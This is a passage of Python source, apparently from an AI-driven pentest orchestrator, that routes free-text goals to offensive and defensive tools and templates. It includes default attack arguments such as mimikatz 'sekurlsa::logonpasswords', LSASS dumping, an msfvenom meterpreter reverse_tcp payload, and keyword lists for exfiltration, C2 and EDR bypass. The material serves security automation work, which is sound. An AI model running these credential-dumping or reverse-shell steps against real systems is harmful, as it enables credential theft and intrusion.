            "qradar": ("curl", "QRadar SIEM query", ""),
            "misp": ("curl", "MISP threat intelligence platform", ""),
            "crackmapexec": (
                "crackmapexec",
                "SMB host reachability and authentication check",
                "smb",
            ),
            "netexec": ("netexec", "SMB host reachability and network authentication check", "smb"),
            # ── Windows Privilege Escalation ──────────────────────────────────────────
            "winpeas": ("winpeas", "Windows privilege escalation enumeration", "quiet"),
            "powerup": ("powerup", "PowerShell privilege escalation checks", "Invoke-AllChecks"),
            "seatbelt": ("seatbelt", "Windows security recon with Seatbelt", "-group=all"),
            "incognito": (
                "incognito",
                "Token impersonation and privilege enumeration",
                "list_tokens -u",
            ),
            "juicypotato": ("JuicyPotatoNG", "JuicyPotato privilege escalation", ""),
            "printspoofer": ("PrintSpoofer", "PrintSpoofer privilege escalation", "-i -c cmd"),
            "godpotato": ("GodPotato", "GodPotato privilege escalation", ""),
            # ── Linux Privilege Escalation ────────────────────────────────────────────
            "linpeas": ("linpeas", "Linux privilege escalation enumeration", ""),
            "pspy": ("pspy", "Linux process monitoring for privesc", ""),
            "linenum": ("linenum", "Linux enumeration for privilege escalation", ""),
            # ── Lateral Movement ──────────────────────────────────────────────────────
            "chisel": ("chisel", "TCP/UDP tunneling and SOCKS proxy", "client"),
            "ligolo": ("ligolo-ng", "Advanced tunneling for pivoting", ""),
            "ligolo-ng": ("ligolo-ng", "Advanced tunneling for pivoting", ""),
            "wmiexec": ("wmiexec", "WMI-based remote command execution", ""),
            "smbexec": ("smbexec", "SMB-based remote command execution", ""),
            "xfreerdp": ("xfreerdp", "Free RDP client for lateral movement", "/v:"),
            "rdesktop": ("rdesktop", "RDP client", ""),
            # ── Persistence ───────────────────────────────────────────────────────────
            "weevely": ("weevely", "PHP web shell generation and management", ""),
            "autoruns": ("autoruns", "Windows autoruns persistence enumeration", ""),
            # ── Defense Evasion ───────────────────────────────────────────────────────
            "veil": ("veil", "AV evasion payload framework", ""),
            "donut": ("donut", "Shellcode generation from .NET/PE", ""),
            "shellter": ("shellter", "Dynamic shellcode injector", ""),
            "msfvenom": (
                "msfvenom",
                "Payload generation with msfvenom",
                "-p windows/x64/meterpreter/reverse_tcp",
            ),
            # ── Post-Exploitation / C2 ────────────────────────────────────────────────
            "msfconsole": ("msfconsole", "Metasploit Framework console", "-q"),
            "empire": ("empire", "PowerShell Empire C2 framework", ""),
            "sliver": ("sliver", "Sliver C2 framework", ""),
            "havoc": ("havoc", "Havoc C2 framework", ""),
            "villain": ("villain", "Villain C2 framework", ""),
            # ── Active Directory ──────────────────────────────────────────────────────
            "rubeus": ("rubeus", "Kerberos attack toolkit", ""),
            "mimikatz": (
                "mimikatz",
                "Credential extraction and Kerberos attacks",
                "sekurlsa::logonpasswords",
            ),
            "pypykatz": ("pypykatz", "Python Mimikatz implementation", "lsa minidump"),
            "nanodump": ("nanodump", "LSASS memory dump", "--write /tmp/lsass.dmp"),
            "lsassy": ("lsassy", "Remote LSASS dumping", ""),
            "certipy": ("certipy", "Active Directory Certificate Services attacks", ""),
            "certify": ("certify", "AD CS vulnerability finder", "find /vulnerable"),
            # ── Social Engineering ────────────────────────────────────────────────────
            "gophish": ("gophish", "Phishing campaign framework", ""),
            "evilginx2": ("evilginx2", "Reverse proxy credential harvesting", ""),
            "modlishka": ("modlishka", "Reverse proxy phishing tool", ""),
            "swaks": ("swaks", "SMTP testing and email spoofing", "--to"),
            # ── Mobile Security ───────────────────────────────────────────────────────
            "mobsf": ("mobsf", "Mobile Security Framework", ""),
            "apkleaks": ("apkleaks", "APK secrets and credential scanner", ""),
            "jadx": ("jadx", "Android DEX to Java decompiler", ""),
            "dex2jar": ("dex2jar", "DEX to JAR conversion", ""),
            "apkid": ("apkid", "Android APK identifier", ""),
            "adb": ("adb", "Android Debug Bridge", "devices"),
            "frida": ("frida", "Dynamic instrumentation toolkit", "-U"),
            "objection": ("objection", "Runtime mobile security toolkit", "explore"),
            # ── IoT / Firmware ────────────────────────────────────────────────────────
            "openocd": ("openocd", "Open On-Chip Debugger for JTAG", ""),
            "flashrom": ("flashrom", "Flash chip programmer and reader", ""),
            "minicom": ("minicom", "Serial terminal for UART access", ""),
            "firmwalker": ("firmwalker", "Firmware security analysis", ""),
            # ── OT / ICS / SCADA ──────────────────────────────────────────────────────
            "mbtget": ("mbtget", "Modbus TCP device enumeration", ""),
            "plcscan": ("plcscan", "PLC device scanner", ""),
            # ── Cloud Attack ──────────────────────────────────────────────────────────
            "aadinternals": ("aadinternals", "Azure AD enumeration and attack toolkit", ""),
            "roadtools": ("roadtools", "Azure AD enumeration via ROADtools", "auth"),
            "powerzure": ("powerzure", "Azure privilege escalation toolkit", ""),
            "azurehound": ("azurehound", "Azure BloodHound data collection", "list"),
            "stormspotter": ("stormspotter", "Azure attack path visualization", ""),
            "gcloud": ("gcloud", "Google Cloud CLI enumeration", "projects list"),
            # ── Kubernetes / Container ────────────────────────────────────────────────
            "cdk": ("cdk", "Container and Kubernetes exploit toolkit", "auto-escape"),
            "kube-hunter": ("kube-hunter", "Kubernetes attack surface mapper", "--remote"),
            "kube-bench": ("kube-bench", "Kubernetes CIS benchmark auditor", ""),
            "kubesec": ("kubesec", "Kubernetes manifest security scanner", "scan"),
            "etcdctl": ("etcdctl", "Etcd datastore CLI access", "get / --prefix"),
            # ── Cryptography / Hash ───────────────────────────────────────────────────
            "hashid": ("hashid", "Hash type identification", ""),
            "rsactftool": ("rsactftool", "RSA CTF attack tool", ""),
            "padbuster": ("padbuster", "Padding oracle attack tool", ""),
            "john": (
                "john",
                "John the Ripper password cracker",
                "--wordlist=/usr/share/wordlists/rockyou.txt",
            ),
            # ── CTF / Binary Exploitation ─────────────────────────────────────────────
            "checksec": ("checksec", "Binary security feature checker", "--file"),
            "ropgadget": ("ROPgadget", "ROP gadget finder", "--binary"),
            "pwndbg": ("pwndbg", "GDB with pwndbg plugin for exploitation", ""),
            "ROPgadget": ("ROPgadget", "ROP gadget finder and chain builder", "--binary"),
            # ── CTF Steganography ─────────────────────────────────────────────────────
            "steghide": ("steghide", "Steganography embed/extract tool", "extract -sf"),
            "stegcracker": ("stegcracker", "Steganography brute force cracker", ""),
            "zsteg": ("zsteg", "Steganography detection in PNG/BMP", ""),
            # ── Purple Team ───────────────────────────────────────────────────────────
            "caldera": ("caldera", "MITRE ATT&CK adversary emulation", ""),
            "vectr": ("vectr", "Purple team exercise tracking", ""),
            "invoke-atomicredteam": (
                "invoke-atomicredteam",
                "Atomic Red Team test execution",
                "Invoke-AtomicTest",
            ),
            # ── Network / MITM ────────────────────────────────────────────────────────
            "bettercap": ("bettercap", "Network attack and monitoring framework", ""),
            "ettercap": ("ettercap", "MITM attack toolkit", "-T -q"),
            "arpspoof": ("arpspoof", "ARP poisoning for MITM", ""),
            # ── Wireless ──────────────────────────────────────────────────────────────
            "wifite": ("wifite", "Automated wireless auditing", "--all"),
            "hcxtools": ("hcxtools", "WiFi PMKID/handshake capture tools", ""),
            "kismet": ("kismet", "Wireless network detector and sniffer", ""),
            # ── Exfiltration ──────────────────────────────────────────────────────────
            "iodine": ("iodine", "DNS tunnel for data exfiltration", ""),
            "ptunnel-ng": ("ptunnel-ng", "ICMP tunnel for data exfiltration", ""),
            "dnscat2": ("dnscat2", "DNS C2 channel", ""),
            # ── Supply Chain ──────────────────────────────────────────────────────────
            "pip-audit": ("pip-audit", "Python dependency vulnerability audit", ""),
            "confused": ("confused", "Dependency confusion attack checker", ""),
            "dalfox": ("dalfox", "XSS parameter scanner", "pipe"),
            "kxss": ("kxss", "Reflected XSS parameter scanner", ""),
            "cewl": ("cewl", "Custom wordlist generator from website", "-d 3 -m 5"),
            "crunch": ("crunch", "Wordlist generator", "8 8"),
            # ── AppSec / DAST / SAST ──────────────────────────────────────────────────
            "semgrep": ("semgrep", "Static analysis tool for code scan", "--config=auto"),
            "bandit": ("bandit", "Python security linter", "-r"),
            "zap-cli": ("zap-cli", "OWASP ZAP daemon scanner CLI", "quick-scan"),
            # ── DFIR / Forensic tools ─────────────────────────────────────────────────
            "velociraptor": ("velociraptor", "Endpoint responder & triage tool", "query"),
            "fls": ("fls", "List directory entries in partition", "-r -p"),
            "icat": ("icat", "Output file contents by inode", ""),
            "foremost": ("foremost", "Forensic file carver", ""),
            # ── Binary Exploitation / Debugging ───────────────────────────────────────
            "gdb": ("gdb", "GNU Debugger", "-q -ex run --args"),
        }
        # ── Step 0.5: Direct tool keyword match ─────────────────────────
        # Matches explicit tool names in the goal. Early-position keywords
        # (first 5 words) always match. Late-position keywords only match
        # if no "comprehensive recon" keywords also appear (to prevent
        # incidental tool mentions like "including Shodan" from overriding
        # templates like external_recon).
        comprehensive_keywords = {
            "attack surface",
            "external attack surface",
            "attack surface mapping",
            "external recon",
            "full external",
            "edge discovery",
            "external perimeter",
            "full recon",
            "comprehensive scan",
            "comprehensive recon",
            "full scope",
            "full audit",
            "security posture",
            "digital footprint",
            "footprint analysis",
            "osint recon",
        }
        has_comprehensive = any(kw in goal_lower for kw in comprehensive_keywords)
        words = goal_lower.split()
        best_kw: str | None = None
        best_pos = -1
        best_tool: str | None = None
        best_desc: str | None = None
        best_flags: str | None = None
        with_phrase = re.search(r"\b(?:with|using|via)\s+(\w+)", goal_lower)
        prefer_tool = with_phrase.group(1) if with_phrase else None
        for kw, (tool, desc, flags) in direct_tool_keywords.items():
            if kw in words:
                pos = words.index(kw)
                if prefer_tool and kw == prefer_tool:
                    pos = max(0, pos - 10)
                if pos <= 5 or not has_comprehensive:
                    if best_pos < 0:
                        best_pos = pos
                        best_kw = kw
                        best_tool = tool
                        best_desc = desc
                        best_flags = flags
                    elif pos < best_pos:
                        best_pos = pos
                        best_kw = kw
                        best_tool = tool
                        best_desc = desc
                        best_flags = flags
        if best_kw:
            compound_match = re.search(r"\b(?:use|run)\s+(\w+)\s+and\s+(\w+)\b", goal_lower)
            compound_tools = []
            if compound_match:
                kw1, kw2 = compound_match.groups()
                for needle, (tool, desc, flags) in direct_tool_keywords.items():
                    if needle == kw1 or needle == kw2:
                        compound_tools.append((tool, desc, flags))
            if len(compound_tools) >= 2:
                steps = []
                for tool, desc, flags in compound_tools:
                    actual_tool = tool
                    if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                        for alt in TOOL_ALTERNATIVES[tool]:
                            if alt in avail_set:
                                actual_tool = alt
                                break
                    steps.append(
                        {
                            "description": desc,
                            "tool": actual_tool,
                            "args": {"target": target, "flags": flags},
                        }
                    )
                return self.create_plan(goal=goal, steps=steps, plan_type=PlanType.DAG)

            actual_tool = str(best_tool)
            if best_tool not in avail_set and best_tool in TOOL_ALTERNATIVES:
                for alt in TOOL_ALTERNATIVES[best_tool]:
                    if alt in avail_set:
                        actual_tool = alt
                        break
            count_m = re.search(r"\bfor\s+(\d+)\s+time", goal_lower)
            if count_m and actual_tool == "ping":
                best_flags = f"-c {count_m.group(1)}"
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": best_desc,
                        "tool": actual_tool,
                        "args": {"target": target, "flags": best_flags},
                    }
                ],
            )

        kw_map = [
            # ── Application Security ──────────────────────────────────────────────────
            (
                (
                    "appsec sast",
                    "static analysis",
                    "semgrep",
                    "bandit",
                    "code review",
                    "secure code audit",
                ),
                "appsec_sast",
            ),
            (
                (
                    "appsec dast",
                    "dynamic scan",
                    "zap scan",
                    "nikto web scan",
                    "web app vulnerability",
                ),
                "appsec_dast",
            ),
            # ── Digital Forensics & Incident Response ─────────────────────────────────
            (
                (
                    "dfir memory",
                    "memory analysis",
                    "volatility forensics",
                    "dump parse",
                    "yara memory",
                ),
                "dfir_memory",
            ),
            (
                (
                    "dfir disk",
                    "disk analysis",
                    "fls directory",
                    "icat file",
                    "foremost carve",
                    "binwalk firmware",
                ),
                "dfir_disk",
            ),
            # ── Threat Hunting ────────────────────────────────────────────────────────
            (
                ("threat hunt endpoint", "endpoint hunt", "osquery processes", "velociraptor info"),
                "threat_hunting_endpoint",
            ),
            (
                (
                    "threat hunt network",
                    "network hunt",
                    "suricata pcap",
                    "zeek logs",
                    "tshark parse",
                ),
                "threat_hunting_network",
            ),
            # ── Compliance & GRC ──────────────────────────────────────────────────────
            (
                (
                    "compliance audit",
                    "cis benchmark",
                    "kube-bench",
                    "openscap eval",
                    "secedit export",
                ),
                "compliance_audit_cis",
            ),
            # ── Exploit Research ──────────────────────────────────────────────────────
            (
                (
                    "exploit research",
                    "binary debug",
                    "gdb run",
                    "checksec file",
                    "rop chain build",
                    "ropexploit",
                ),
                "exploit_research",
            ),
            # ── Post-Exploitation ────────────────────────────────────────────────────
            (
                (
                    "windows privesc",
                    "winpeas",
                    "token impersonation",
                    "juicy potato",
                    "print spoofer",
                    "god potato",
                    "seimpersonate",
                    "unquoted service",
                    "powerup",
                    "seatbelt",
                    "windows privilege escalation",
                ),
                "windows_privesc",
            ),
            (
                (
                    "linux privesc",
                    "linpeas",
                    "suid exploit",
                    "sudo abuse",
                    "capabilities exploit",
                    "nfs root squash",
                    "cron abuse",
                    "linux privilege escalation",
                    "gtfobins",
                ),
                "linux_privesc_full",
            ),
            (
                (
                    "lateral movement",
                    "pass the hash",
                    "pass-the-hash",
                    "pth attack",
                    "wmiexec",
                    "psexec lateral",
                    "rdp lateral",
                    "pivoting",
                    "port forward",
                    "socks proxy",
                    "chisel",
                    "ligolo",
                ),
                "lateral_movement",
            ),
            (
                (
                    "persistence",
                    "backdoor",
                    "webshell",
                    "scheduled task",
                    "registry run",
                    "cron persistence",
                    "startup persistence",
                    "autoruns",
                    "service persistence",
                ),
                "persistence",
            ),
            (
                (
                    "c2 setup",
                    "command and control",
                    "c2 infrastructure",
                    "msfvenom",
                    "reverse shell",
                    "listener setup",
                    "meterpreter",
                    "payload generation",
                ),
                "c2_setup",
            ),
            # ── Social Engineering ───────────────────────────────────────────────────
            (
                (
                    "phishing",
                    "spear phishing",
                    "phishing campaign",
                    "gophish",
                    "clone site",
                    "credential harvest",
                    "email spoofing",
                    "vishing",
                    "smishing",
                    "pretexting",
                    "social engineering",
                ),
                "phishing_campaign",
            ),
            # ── IoT / Embedded ───────────────────────────────────────────────────────
            (
                (
                    "firmware",
                    "firmware analysis",
                    "iot device",
                    "iot security",
                    "uart",
                    "jtag",
                    "bootloader",
                    "embedded device",
                    "flash dump",
                ),
                "iot_firmware",
            ),
            # ── OT / ICS ─────────────────────────────────────────────────────────────
            (
                (
                    "ics",
                    "scada",
                    "modbus",
                    "dnp3",
                    "plc",
                    "s7",
                    "industrial network",
                    "ot network",
                    "hmi",
                    "ics recon",
                    "scada enum",
                ),
                "ics_recon",
            ),
            # ── Mobile ───────────────────────────────────────────────────────────────
            (
                (
                    "android analysis",
                    "apk analysis",
                    "android security",
                    "adb",
                    "apkleaks",
                    "frida android",
                    "objection android",
                    "mobsf android",
                    "jadx",
                    "dex2jar",
                ),
                "mobile_android",
            ),
            (
                (
                    "ios analysis",
                    "ios security",
                    "ipa analysis",
                    "jailbreak",
                    "objection ios",
                    "frida ios",
                    "ssl pinning bypass",
                    "cycript",
                    "clutch",
                ),
                "mobile_ios",
            ),
            # ── Cloud Attack ─────────────────────────────────────────────────────────
            (
                (
                    "azure",
                    "azure ad",
                    "azure ad enum",
                    "aadinternals",
                    "powerzure",
                    "roadtools",
                    "azurehound",
                    "microsoft 365",
                    "entra id",
                    "office 365",
                    "o365",
                ),
                "cloud_azure",
            ),
            (("gcp", "google cloud", "gcp enum", "gcloud", "gcpbucketbrute"), "cloud_gcp"),
            # ── Kubernetes / Container ───────────────────────────────────────────────
            (
                (
                    "kubernetes attack",
                    "k8s attack",
                    "container escape",
                    "etcd access",
                    "rbac audit",
                    "pod attack",
                    "kube-hunter",
                    "kube-bench",
                    "k8s exploit",
                ),
                "k8s_attack",
            ),
            # ── Cryptography ─────────────────────────────────────────────────────────
            (
                (
                    "hash crack",
                    "hash cracking",
                    "rainbow table",
                    "hash identify",
                    "padding oracle",
                    "crypto attack",
                    "rsactftool",
                ),
                "crypto_attack",
            ),
            # ── CTF ──────────────────────────────────────────────────────────────────
            (
                (
                    "ctf forensics",
                    "capture the flag forensics",
                    "steganography",
                    "ctf stego",
                    "stegsolve",
                    "steg challenge",
                ),
                "ctf_forensics",
            ),
            (
                (
                    "pwn",
                    "pwnable",
                    "buffer overflow",
                    "rop chain",
                    "heap exploit",
                    "format string exploit",
                    "bof",
                    "ctf pwn",
                    "binary exploit",
                ),
                "ctf_pwn",
            ),
            (
                (
                    "ctf crypto",
                    "crypto challenge",
                    "rsa challenge",
                    "xor cipher",
                    "classical cipher",
                    "vigenere",
                    "caesar cipher",
                ),
                "ctf_crypto",
            ),
            # ── Blue Team ────────────────────────────────────────────────────────────
            (
                (
                    "threat hunt",
                    "threat hunting",
                    "sigma hunt",
                    "yara hunt",
                    "osquery hunt",
                    "ioc hunt",
                    "hunting for",
                    "hunt for",
                ),
                "threat_hunting",
            ),
            (
                (
                    "incident response",
                    "ir triage",
                    "evidence collection",
                    "forensic triage",
                    "ir workflow",
                    "incident handling",
                ),
                "incident_response_full",
            ),
            # ── Purple Team ──────────────────────────────────────────────────────────
            (
                (
                    "purple team",
                    "atomic red team",
                    "attack simulation",
                    "caldera",
                    "vectr",
                    "detection validation",
                    "mitre att&ck simulation",
                ),
                "purple_team",
            ),
            # ── Defense Evasion ──────────────────────────────────────────────────────
            (
                (
                    "edr bypass",
                    "av bypass",
                    "amsi bypass",
                    "defense evasion",
                    "obfuscation",
                    "lolbas",
                    "etw bypass",
                    "uac bypass",
                    "payload obfuscation",
                ),
                "edr_bypass",
            ),
            # ── Exfiltration ─────────────────────────────────────────────────────────
            (
                (
                    "data exfil",
                    "exfiltration",
                    "dns exfil",
                    "dns tunnel",
                    "icmp tunnel",
                    "covert channel",
                    "data theft",
                ),
                "data_exfiltration",
            ),
            # ── Bug Bounty ───────────────────────────────────────────────────────────
            (
                (
                    "bug bounty",
                    "vdp",
                    "responsible disclosure",
                    "hackerone",
                    "bugcrowd",
                    "bug hunting",
                ),
                "bug_bounty_web",
            ),
            # ── Supply Chain ─────────────────────────────────────────────────────────
            (
                (
                    "supply chain",
                    "dependency confusion",
                    "typosquatting",
                    "sbom",
                    "bill of materials",
                    "sca scan",
                ),
                "supply_chain",
            ),
            (("ssl", "tls", "cipher suite"), "ssl_audit"),
            (("http header", "response header", "security header"), "headers_check"),
            (("cors", "cross-origin", "cross origin", "preflight"), "cors_check"),
            (
                (
                    "dns recon",
                    "dns enumeration",
                    "dns record",
                    "nameserver",
                    "mx record",
                    "dns resolution",
                ),
                "dns_recon",
            ),
            (
                (
                    "subdomain",
                    "subdomain enum",
                    "subdomain discover",
                    "dns enum",
                    "dnsrecon",
                    "subdomain brute",
                ),
                "recon_full",
            ),
            (
                (
                    "network scan",
                    "infrastructure scan",
                    "port scan",
                    "full port scan",
                    "open ports",
                    "tcp scan",
                ),
                "network_scan",
            ),
            (
                (
                    "brute force",
                    "crack password",
                    "password crack",
                    "credential brute",
                    "crack the password",
                ),
                "brute_force",
            ),
            # File hash / checksum operations (after brute_force so "crack password hash" hits brute_force first)
            (
                (
                    "hash",
                    "checksum",
                    "md5",
                    "md5sum",
                    "sha1",
                    "sha1sum",
                    "sha256",
                    "sha256sum",
                    "sha512",
                    "sha512sum",
                    "b2sum",
                    "compute hash",
                    "generate checksum",
                    "hash of",
                    "file hash",
                    "hash sum",
                    "hash file",
                ),
                "file_hash",
            ),
            # Specific AD attack tools (before generic ad_assessment)
            (("dcsync", "dc sync", "domain replication"), "ad_assessment"),
            (("kerberoast", "kerberoasting"), "ad_assessment"),
            (("asrep", "as-rep", "asrep roast"), "ad_assessment"),
            (("bloodhound", "bloodhound collector", "bloodhound-python"), "ad_assessment"),
            (("zerologon", "zerologon check"), "ad_assessment"),
            (("petitpotam", "petitpotam check"), "ad_assessment"),
            # Wireless & Bluetooth (before generic wifi_audit)
            (("deauth", "deauthentication", "beacon flood", "aireplay"), "wifi_audit"),
            (("bluetooth", "bt scan", "hci0", "bluez"), "wifi_audit"),
            (("wifi", "wireless", "wpa", "wpa2", "wep", "handshake"), "wifi_audit"),
            (("ad ", "active directory", "domain controller"), "ad_assessment"),
            (
                (
                    "external recon",
                    "external attack surface",
                    "internet scan",
                    "external perimeter",
                    "full external",
                    "edge discovery",
                    "attack surface",
                    "attack surface mapping",
                    "red team",
                    "bug bounty",
                ),
                "external_recon",
            ),
            (
                (
                    "osint recon",
                    "open source",
                    "recon-ng",
                    "osint gather",
                    "osint intelligence",
                    "osint assessment",
                    "osint investigation",
                    "osint collection",
                    "osint automation",
                    "deep osint",
                    "full osint",
                    "complete osint",
                    "thorough osint",
                    "target profile",
                    "target profiling",
                    "adversary recon",
                    "reconnaissance lifecycle",
                    "full scope",
                    "tier 1 osint",
                    "osint profiling",
                    "automated recon",
                    "recon pipeline",
                    "continuous recon",
                    "recon automation",
                    "digital footprint",
                    "footprint analysis",
                ),
                "osint_recon",
            ),
            (
                ("email recon", "email enum", "email harvest", "smtp enum", "mail server"),
                "email_recon",
            ),
            (
                (
                    "cloud audit",
                    "cloud infrastructure",
                    "cloud assets",
                    "cloud storage",
                    "aws",
                    "s3 ",
                    "azure",
                    "gcp",
                ),
                "cloud_audit",
            ),
            (
                (
                    "smb enum",
                    "smb",
                    "smb share",
                    "windows share",
                    "cifs",
                    "netbios",
                    "crackmapexec",
                    "netexec",
                    "enum4linux",
                ),
                "smb_enum",
            ),
            (("privesc", "privilege escalation", "linux audit", "suid"), "linux_privesc"),
            (("web audit", "web scan", "website", "webapp", "web app"), "web_audit"),
            (("scan", "vuln scan", "cve scan", "vulnerability scan"), "vuln_scan"),
            (
                (
                    "passive recon",
                    "passive osint",
                    "passive scan",
                    "passive reconnaissance",
                    "passive intel",
                    "passive intelligence",
                    "passive information",
                    "stealth osint",
                    "non intrusive",
                    "initial access",
                    "pre engagement",
                    "quiet recon",
                ),
                "passive_recon",
            ),
            # ── Non-scanning: Forensics ──────────────────────────────────
            (
                (
                    "memory forensics",
                    "memory analysis",
                    "memory dump",
                    "volatility",
                    "process memory",
                    "injected code",
                    "mimikatz detection",
                    "cobalt strike",
                    "beacon detection",
                ),
                "memory_forensics",
            ),
            (
                (
                    "disk forensics",
                    "disk analysis",
                    "deleted file",
                    "file carving",
                    "file system analysis",
                    "sleuthkit",
                    "foremost",
                    "binwalk",
                    "partition table",
                    "slack space",
                ),
                "disk_forensics",
            ),
            # ── Non-scanning: SAST / Code Review ──────────────────────────
            (
                (
                    "code review",
                    "static analysis",
                    "sast scan",
                    "source code scan",
                    "code security",
                    "semgrep",
                    "python security",
                    "bandit",
                ),
                "code_review_sast",
            ),
            (
                (
                    "secrets scan",
                    "secret scanning",
                    "credential leak",
                    "hardcoded secrets",
                    "gitleaks",
                    "trufflehog",
                    "find secrets",
                    "detect secrets",
                ),
                "secrets_scan",
            ),
            (
                (
                    "iac scan",
                    "terraform scan",
                    "cloudformation scan",
                    "infrastructure as code",
                    "checkov",
                    "tfsec",
                ),
                "iac_scan",
            ),
            # ── Non-scanning: Container Security ─────────────────────────
            (
                (
                    "container scan",
                    "container security",
                    "docker scan",
                    "docker image",
                    "image vuln",
                    "trivy",
                    "grype",
                    "syft",
                    "sbom",
                    "bill of materials",
                ),
                "container_scan",
            ),
            # ── Non-scanning: Cloud Audit (AWS-specific) ────────────────
            (
                (
                    "aws audit",
                    "aws security",
                    "cloud audit",
                    "cloud security audit",
                    "prowler",
                    "scoutsuite",
                ),
                "cloud_audit_aws",
            ),
            # ── Non-scanning: Malware Analysis ──────────────────────────
            (
                (
                    "malware analysis",
                    "malware sample",
                    "ransomware analysis",
                    "suspicious binary",
                    "malicious file",
                    "yara scan",
                    "malware scan",
                ),
                "malware_analysis",
            ),
            # ── Non-scanning: Reverse Engineering ────────────────────────
            (
                (
                    "reverse engineering",
                    "binary analysis",
                    "decompile",
                    "apk analysis",
                    "android analysis",
                    "radare2",
                    "apktool",
                    "disassembly",
                    "obfuscated",
                ),
                "reverse_engineering",
            ),
            (
                (
                    "full audit",
                    "full scan",
                    "comprehensive scan",
                    "comprehensive recon",
                    "thorough check",
                    "thorough recon",
                    "full recon",
                    "security posture",
                    "pentest",
                    "penetration test",
                    "security assessment",
                    "security audit",
                ),
                "full_audit",
            ),
        ]
        for keywords, template_name in kw_map:
            if any(kw in goal_lower for kw in keywords):
                return self.create_from_template(template_name, goal, available_tools=avail_set)

        # ── Step 0.5: Multi-word direct tool keywords fallback ──────────
        # Runs after template matching so named workflows take priority
        # over broader substring patterns.
        for kw, tool, desc, flags in _MULTI_WORD_CHECKS:
            if kw in goal_lower:
                if has_comprehensive:
                    continue
                best_kw = kw
                best_tool = tool
                best_desc = desc
                best_flags = flags
                break
        if best_kw:
            actual_tool = str(best_tool)
            if best_tool not in avail_set and best_tool in TOOL_ALTERNATIVES:
                for alt in TOOL_ALTERNATIVES[best_tool]:
                    if alt in avail_set:
                        actual_tool = alt
                        break
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": best_desc,
                        "tool": actual_tool,
                        "args": {"target": target, "flags": best_flags},
                    }
                ],
            )

        # ── Step 0: NLP Semantic Intent Parsing (after direct keywords) ──
        intent = self._nlp.parse(goal)
        if intent.tool_name and intent.confidence > 3.5:
            actual_tool = intent.tool_name
            if actual_tool not in avail_set and available_tools:
                for alt in TOOL_ALTERNATIVES.get(actual_tool, []):
                    if alt in avail_set:
                        actual_tool = alt
                        break
            args = {"target": target}
            flags = ""

            if actual_tool in ("nmap", "masscan"):
                if intent.parameters.get("speed") == "fast":
                    flags += "-T4 "
                elif intent.parameters.get("speed") == "stealth":
                    flags += "-sS -T2 "
                else:
                    flags += "-sT -T4 "
                if intent.parameters.get("ports") == "all":
                    flags += "-p- "
                elif intent.parameters.get("ports"):
                    flags += f"-p {intent.parameters['ports']} "
                else:
                    flags += "--top-ports 100 "
                if intent.parameters.get("verbose"):
                    flags += "-v "
                if intent.parameters.get("timeout"):
                    flags += f"--host-timeout {intent.parameters['timeout']} "
                if intent.parameters.get("format") == "xml":
                    flags += "-oX - "
            elif actual_tool == "nuclei":
                if intent.parameters.get("severity"):
                    flags += f"-s {intent.parameters['severity']} "
                if intent.parameters.get("format") == "json":
                    flags += "-json-export "
                if intent.parameters.get("timeout"):
                    flags += f"-timeout {intent.parameters['timeout'].replace('s', '')} "
            elif actual_tool in ("ffuf", "gobuster"):
                if intent.parameters.get("timeout"):
                    flags += f"-t {intent.parameters['timeout'].replace('s', '')} "
                if intent.parameters.get("format") == "json":
                    flags += "-o result.json -of json "

            if flags:
                args["flags"] = flags.strip()

            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": f"Execute {actual_tool} on {target}",
                        "tool": actual_tool,
                        "args": args,
                    }
                ],
            )

        # ── Step 3: Availability-weighted index search ──────────────────
        tool_match = None
        if available_tools:
            if self._keyword_index:
                candidates = self._search_index(goal)
                for c in candidates:
                    if c in avail_set:
                        pattern = r"(?<!\w)" + re.escape(c.lower()) + r"(?!\w)"
                        if re.search(pattern, goal_lower):
                            tool_match = c
                            break
            if not tool_match:
                for t in available_tools:
                    if len(t) < 3:
                        continue
                    pattern = r"(?<!\w)" + re.escape(t.lower()) + r"(?!\w)"
                    if re.search(pattern, goal_lower):
                        tool_match = t
                        break
        if tool_match:
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": f"Execute {tool_match} on {target}",
                        "tool": tool_match,
                        "args": {
                            "target": target,
                            "flags": "-sT -T4 --top-ports 100" if tool_match == "nmap" else "",
                        },
                    }
                ],
            )

        # ── Step 3.5: Compound vulnerability request ───────────────────
        # If text mentions multiple specific vuln keywords, use vuln_scan template
        if target:
            compound_vuln_keywords = {
                "log4j",
                "log4shell",
                "heartbleed",
                "shellshock",
                "shellsock",
                "spring4shell",
                "struts",
                "zerologon",
                "petitpotam",
            }
            found_vulns = [kw for kw in compound_vuln_keywords if kw in goal_lower]
            # Also check for "and" connecting multiple security terms
            and_vuln_pattern = r"\b(?:log4j|heartbleed|shellshock|cve-\d+|xss|sqli|lfi|rfi|ssrf|idor)\s+and\s+(?:\w+\s+)*\b(?:log4j|heartbleed|shellshock|cve-\d+|xss|sqli|lfi|rfi|ssrf|idor)\b"
            if len(found_vulns) >= 2 or re.search(and_vuln_pattern, goal_lower):
                return self.create_from_template("vuln_scan", goal, available_tools=avail_set)
            # Compound web vuln: open redirect + clickjacking → combine curl + nuclei
            if "open redirect" in goal_lower and (
                "clickjack" in goal_lower or "x-frame" in goal_lower
            ):
                return self.create_plan(
                    goal=goal,
                    plan_type=PlanType.DAG,
                    steps=[
                        {
                            "description": "Open redirect scan",
                            "tool": "nuclei",
                            "args": {
                                "target": target.replace("https://", "")
                                .replace("http://", "")
                                .split("/")[0],
                                "flags": "-t http/redirect",
                            },
                        },
                        {
                            "description": "Clickjacking protection check",
                            "tool": "curl",
                            "args": {"target": target, "flags": "-sI -X OPTIONS"},
                        },
                    ],
                )

        # ── Step 4: Intent-based tool selection ─────────────────────────
        # Also try intent matching even without a target (e.g., "find tech stack")
        if not target:
            intent_map = {
                "tech": ("whatweb", "Technology fingerprinting", ""),
                "framework": ("whatweb", "Technology fingerprinting", ""),
                "wp": ("wpscan", "WordPress vulnerability scan", ""),
                "wordpress": ("wpscan", "WordPress vulnerability scan", ""),
                "cms": ("whatweb", "CMS fingerprinting", ""),
                "vuln": ("nuclei", "Vulnerability scan", "-t http"),
                "cve": ("nuclei", "CVE scan", "-t http/cves"),
                "fuzz": ("ffuf", "Directory fuzzing", f"-w {_COMMON_WORDLIST}"),
                "directories": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "dirbust": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
